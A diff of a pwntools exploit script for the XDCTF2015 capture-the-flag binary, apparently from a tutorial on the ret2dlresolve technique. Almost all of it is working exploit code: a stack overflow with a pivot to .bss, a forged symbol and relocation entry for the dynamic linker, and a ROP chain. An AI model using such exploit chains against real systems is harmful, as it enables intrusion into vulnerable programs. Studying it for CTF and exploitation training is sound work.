@@ -1,27 +1,23 @@
 from pwn import *
-elf = ELF('main')
-r = process('./main')
-rop = ROP('./main')
+elf = ELF('./main_partial_relro_32')
+r = process('./main_partial_relro_32')
+rop = ROP('./main_partial_relro_32')
 
 offset = 112
 bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
-stack_size = 0x800
-base_stage = bss_addr + stack_size
-## padding
-rop.raw('a' * offset)
-## read 100 byte to base_stage
-rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+# stack privot to bss segment, set esp = base_stage
+stack_size = 0x800 # new stack size is 0x800
+base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
+rop.raw('a' * offset) # padding
+rop.read(0, base_stage, 100) # read 100 byte to base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write sh="/bin/sh"
-rop = ROP('./main')
+
+rop = ROP('./main_partial_relro_32')
 sh = "/bin/sh"
 
 plt0 = elf.get_section_by_name('.plt').header.sh_addr
@@ -29,29 +25,24 @@ rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
-## making fake write symbol
+# make a fake write symbol at base_stage + 32 + align
 fake_sym_addr = base_stage + 32
-align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
-                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
 fake_sym_addr = fake_sym_addr + align
-index_dynsym = (
-    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
-# plus 10 since the size of Elf32_Sym is 16.
-st_name = fake_sym_addr + 0x10 - dynstr
+index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
+st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
 fake_write_sym = flat([st_name, 0, 0, 0x12])
 
-## making fake write relocation
-
-# making base_stage+24 ---> fake reloc
+# make fake write relocation at base_stage+24
 index_offset = base_stage + 24 - rel_plt
 write_got = elf.got['write']
-r_info = (index_dynsym << 8) | 0x7
+r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
 fake_write_reloc = flat([write_got, r_info])
 
+# construct rop chain
 rop.raw(plt0)
 rop.raw(index_offset)
-# fake ret addr of write
-rop.raw('bbbb')
+rop.raw('bbbb') # fake ret addr of write
 rop.raw(1)
 rop.raw(base_stage + 80)
 rop.raw(len(sh))
@@ -62,6 +53,5 @@ rop.raw('write\x00')  # there must be a \x00 to mark the end of string
 rop.raw('a' * (80 - len(rop.chain())))
 rop.raw(sh)
 rop.raw('a' * (100 - len(rop.chain())))
-
 r.sendline(rop.chain())
 r.interactive()
